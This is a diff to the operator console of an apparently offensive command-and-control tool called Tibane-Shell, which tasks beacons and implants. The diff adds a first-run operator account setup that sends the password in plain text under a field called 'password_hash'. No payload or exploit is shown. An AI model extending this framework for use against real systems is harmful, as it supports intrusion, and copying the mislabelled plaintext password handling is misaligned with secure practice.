@@ -6,6 +6,7 @@
 #include <readline/readline.h>
 #include <readline/history.h>
 #include <crypt.h>
+#include <unistd.h>
 #include <sys/stat.h>
 #include <unistd.h>
 #include <stdbool.h>
@@ -54,11 +55,13 @@ const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
 										"   ls [operator/implant] : show all files from server\n"
 										"   batch-task [cmd] [os](optional) \n"
 										"   quit, q, exit : exit the program\n"
+										"   add-operator : add a new operator\n"
 										"\n[*] Tibane-shell (Beacon Usage) [*]\n\n"                              
 										"   new-task [task] : Issue new task for the beacon\n"
 										"   list-tasks : Show all information abouts tasks for beacon\n"
 										"   response-task [task id] : show response for specific task\n"
 										"   update-task [id] [cmd] : update task (only if it is not completed)\n";
+										
 
 
 void banner() {
@@ -80,6 +83,7 @@ static const std::string IMPLANT_TEMPLATE = R"TEMPLATE(
 	
 )TEMPLATE";
 
+
 class Communicate {
 	private:
 	int sock;
@@ -91,6 +95,7 @@ class Communicate {
 	void send_json(const char *json_str);
 	char *recv_json();
 	bool authenticate();
+	void check_user();
 	void quit();
 	bool verify_id(const char* id);
 	char *view_files(const char* dir);
@@ -156,6 +161,8 @@ int main(int argc, char *argv[]) {
 
 	Communicate com;
 	
+	com.check_user();
+
 	
 	for (int i = 0; i < 3; i++) {
 		if (com.authenticate() == true) {
@@ -764,6 +771,49 @@ bool Communicate::authenticate() {
 	return false;
 }
 
+void Communicate::check_user() {
+	cJSON *check = cJSON_CreateObject();
+	
+	cJSON_AddStringToObject(check, "Info", "check operator");
+	char *info = cJSON_Print(check);
+	send_json(info);
+	free(info);
+	cJSON_Delete(check);
+
+	char *buffer = recv_json();
+	
+	cJSON *results = cJSON_Parse(buffer);
+	cJSON *user_exists = cJSON_GetObjectItem(results, "User Exists");
+
+	if (!cJSON_IsTrue(user_exists)) {
+		char user[BUFFER_SIZE];
+		char pass[BUFFER_SIZE];
+		puts("\n[-] Add new user\n");
+		printf("[+] Enter Username: ");
+		if (fgets(user, sizeof(user) -1, stdin) == NULL) {
+        	        return;
+        	}
+		user[strcspn(user, "\n")] = 0;
+		printf("[+] Enter Password: ");
+		if (fgets(pass, sizeof(pass) -1, stdin) == NULL) {
+        	        return;
+        	}
+		pass[strcspn(pass, "\n")] = 0;
+
+		cJSON *add_user = cJSON_CreateObject();
+
+		cJSON_AddStringToObject(add_user, "username", user);
+		cJSON_AddStringToObject(add_user, "password_hash", pass);
+
+		char *c = cJSON_Print(add_user);
+		send_json(c);
+		free(c);
+		cJSON_Delete(add_user);
+	}
+
+}
+
+
 void Communicate::quit() {
 	cJSON *info = cJSON_CreateObject();
 	if (!info) {
@@ -1088,3 +1138,4 @@ bool Communicate::new_batch_tasks(const char* command, const char* os) {
 	free(reply);
 	return false;
 }
+
